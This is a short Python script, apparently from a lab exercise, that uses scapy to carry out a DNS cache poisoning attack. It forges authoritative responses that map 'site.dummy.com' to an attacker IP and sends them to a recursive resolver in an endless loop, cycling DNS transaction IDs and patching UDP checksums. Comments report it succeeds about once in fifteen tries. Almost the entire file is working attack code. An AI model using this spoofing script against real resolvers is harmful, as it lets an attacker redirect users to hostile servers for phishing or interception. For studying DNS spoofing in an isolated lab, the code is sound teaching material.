#import os
#os.sys.path.append("/home/attacker/.local/bin")
import random
from scapy.all import *

# Basically all the code below is explained in the other
# files in detail. This code is lightweight and simple. It
# anticipates a query from a recursive nameserver to an authoritative
# nameserver andspoofs the authoritative nameserver to inject a
# false record into the cache. When the RTT between the auth and recursive
# servers is ~100ms, I found that this poisoning attempt would succeed 1/15 times
# or so. Note that we are assuming the recursive resolver uses a fixed source port
# for queries.
target_domain = "site.dummy.com"
target_resolver_ip = '192.168.16.130'
attacker_ip = '192.168.16.158'
target_auth_ip = '192.168.16.150'
source_port = 50000


def patch(dns_frame, pseudo_hdr, dns_id):
    """Adjust the DNS id and patch the UDP checksum within the given Ethernet frame"""
    # set dns id
    # the byte offsets can be found in Wireshark
    dns_frame[42] = (dns_id >> 8) & 0xFF
    dns_frame[43] = dns_id & 0xFF

    # reset checksum
    dns_frame[40] = 0x00
    dns_frame[41] = 0x00

    # calc new checksum
    ck = checksum(pseudo_hdr + dns_frame[34:])
    if ck == 0:
        ck = 0xFFFF
    cs = struct.pack("!H", ck)
    dns_frame[40] = cs[0]
    dns_frame[41] = cs[1]


response = Ether() / IP(src=target_auth_ip, dst=target_resolver_ip) / \
           UDP(sport=53, dport=source_port) / \
           DNS(id=0, qd=DNSQR(qname=target_domain), aa=1, qr=1,
               an=DNSRR(rrname=target_domain, ttl=36000, rdata=attacker_ip))
dns_frame = bytearray(raw(response))
pseudo_hdr = struct.pack(
    "!4s4sHH",
    inet_pton(socket.AF_INET, response["IP"].src),
    inet_pton(socket.AF_INET, response["IP"].dst),
    socket.IPPROTO_UDP,
    len(dns_frame[34:]),
)
s = conf.L2socket()

i = 0
while True:
    if i < 1024:
        i = 1024
    patch(dns_frame, pseudo_hdr, (i + 1024) % 65535)
    s.send(dns_frame)
    i += 1
